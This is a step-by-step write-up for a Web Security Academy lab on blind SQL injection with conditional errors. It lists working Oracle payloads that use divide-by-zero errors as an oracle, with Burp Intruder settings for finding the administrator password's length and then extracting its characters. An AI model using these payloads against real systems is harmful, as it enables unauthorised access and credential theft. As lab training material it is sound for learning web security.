# SQL Injection Lab 12 - Blind SQL injection with conditional errors

## Manual Solution

### 1. Access the lab in Web Security Academy

### 2. Initial Setup:
   - Open Burp Suite and intercept a GET request to the website
   - Send the captured request to Repeater for testing

### 3. Verify SQL Injection Vulnerability:
   - Add trackingID parameter: `'||(SELECT '')||'`
   - We saw an error in the response

### 4. Confirm database type:
   - Add trackingID parameter: `'||(SELECT '' FROM dual)||'`
   - We don't see an error in the response
   - We can assume that the database is Oracle

### 5. Determine Administrator User Exists:
   - Add trackingID parameter: `'||(SELECT '' FROM users WHERE username = 'administrator')||'`
   - We don't see an error in the response
   - We can assume that the administrator user exists
   
### 6. Determine Administrator User Exists with conditional errors:
   - Add trackingID parameter: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   - We see internal server error in the response
   - So if the condition is true, we will see an internal server error

### 7. Determine Password Length:
   - Add trackingID parameter: `'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   - Use Intruder with:
     * Payload position: `1`
     * Payload type: Numbers (1-60)
   - Password length is identified where response lengths change

### 8. Extract Password Characters:
   - Add trackingID parameter: `'||(SELECT CASE WHEN (SUBSTR(password,1,1) = 'a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   - Configure Intruder:
     * First position: `SUBSTR(password,[position],1)`
       - Payload type: Numbers (1 to password length)
     * Second position: Character to test
       - Payload type: Brute forcer (a-z, 0-9)
   - Identify correct characters by analyzing response lengths

### 9. Login:
   - Use extracted password to login as administrator
   - Verify successful access to admin account

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_10.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
